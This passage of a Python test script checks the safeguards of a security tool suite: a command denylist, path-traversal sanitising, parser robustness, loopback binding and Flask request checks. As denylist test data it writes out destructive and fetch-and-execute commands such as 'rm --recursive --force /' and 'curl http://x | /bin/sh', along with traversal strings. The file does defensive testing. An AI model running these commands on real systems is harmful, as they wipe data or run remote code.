check(code == 400, "c2 campaign armed:'true' (string) → not armed")
for k in ("NAVI_ALLOW_WRITES", "NAVI_REMOTE_CODE_EXECUTION"):
    os.environ.pop(k, None)
for cmd in ("rm --recursive --force /", "bash <(curl -s http://x/i.sh)", "wget -qO- http://x | python3",
            "curl http://x | /bin/sh"):
    check(navi_cli.scan_command(cmd), f"denylist flags: {cmd}")
check(not navi_cli.scan_command("uptime"), "denylist leaves benign commands alone")
c2page = open(os.path.join(ROOT, "agents", "c2", "page.html"), encoding="utf-8").read()
check("a warning, not a guard" in c2page and "API.post('upload',{filename:f.name,content_b64:b64,confirm:true})" in c2page,
      "c2 page labels the denylist advisory and confirms uploads")

# ---- 11: contract names, literal_eval, MCP bind ----------------------------------------------
for nm in ("..\\..\\evil", "../../etc/x", "a/b\\c", "..", ".hidden", "C:\\Windows\\x", "ok name-1.2"):
    s_ = contract.safe_name(nm)
    check(re.fullmatch(r"[A-Za-z0-9 _.-]+", s_) and not s_.startswith(".") and "/" not in s_ and "\\" not in s_,
          f"contract.safe_name({nm!r}) → {s_!r}")
    pth = contract._contract_path(nm)
    check(os.path.dirname(pth) == os.path.realpath(os.environ["CONTRACT_DIR"]), f"contract path for {nm!r} stays in CONTRACT_DIR")
out = contract.save("..\\..\\evil")
check(os.path.dirname(out["path"]) == os.path.realpath(os.environ["CONTRACT_DIR"]), "contract.save confines a Windows-style traversal")
from core import was as was_core, compliance as comp_core  # noqa: E402
for junk in ("[" * 100000, "(" * 3000, "{" * 3000, "1" * 300000, "{'A1': [1, 2]}", "{'a': {1, 2}}", None, ""):
    try:
        was_core.parse_owasp(junk); was_core.parse_tech(junk); comp_core.parse_reference(junk)
        check(True, f"literal_eval parsers survive {str(junk)[:12]!r}…")
    except Exception as e:
        check(False, f"literal_eval parsers survive {str(junk)[:12]!r}: {type(e).__name__}")
mcp_src = open(os.path.join(ROOT, "hounds_mcp.py")).read()
check("HOUNDS_MCP_ALLOW_REMOTE" in mcp_src and "is_loopback_bind(host)" in mcp_src and "SystemExit(2)" in mcp_src,
      "hounds_mcp refuses a non-loopback HOUNDS_MCP_HOST unless HOUNDS_MCP_ALLOW_REMOTE=1")

# ---- Flask parity (when installed) -----------------------------------------------------------
try:
    import flask  # noqa: F401
    import app_flask
    cl = app_flask.app.test_client()
    r = cl.get("/api/health", headers={"Host": "localhost"})
    check(r.status_code == 200 and r.headers.get("X-Frame-Options") == "SAMEORIGIN", "flask: health 200 + headers")
    check(cl.get("/api/health", headers={"Host": "evil.example"}).status_code == 403, "flask: foreign Host → 403")
    check(cl.post("/api/settings/status", json={}, headers={"Host": "localhost", "Origin": "null"}).status_code == 403,
          "flask: Origin null → 403")
    check(cl.get("/agents/settings/api.py", headers={"Host": "localhost"}).status_code == 404, "flask: no .py source")
    check(app_flask.app.config["MAX_CONTENT_LENGTH"] == security.MAX_BODY, "flask: body cap configured")
    r = cl.post("/api/settings/set_env", json={"env": {"NAVI_BIN": "/bin/sh"}}, headers={"Host": "localhost"})
    check(os.environ.get("NAVI_BIN") == FAKE, "flask: NAVI_BIN refused")
    os.environ["HOUNDS_BIND"] = "0.0.0.0"
    check(cl.get("/api/health", headers={"Host": "localhost"}).status_code == 401, "flask: token required off-loopback")
    r = cl.get("/?token=" + security.TOKEN, headers={"Host": "localhost"})
    check(r.status_code == 302 and "HttpOnly" in r.headers.get("Set-Cookie", ""), "flask: token → cookie exchange")
    os.environ.pop("HOUNDS_BIND")
except ImportError:
    print("skip flask parity (flask not installed)")

print(f"\n{len(fails)} failure(s)")
sys.exit(1 if fails else 0)
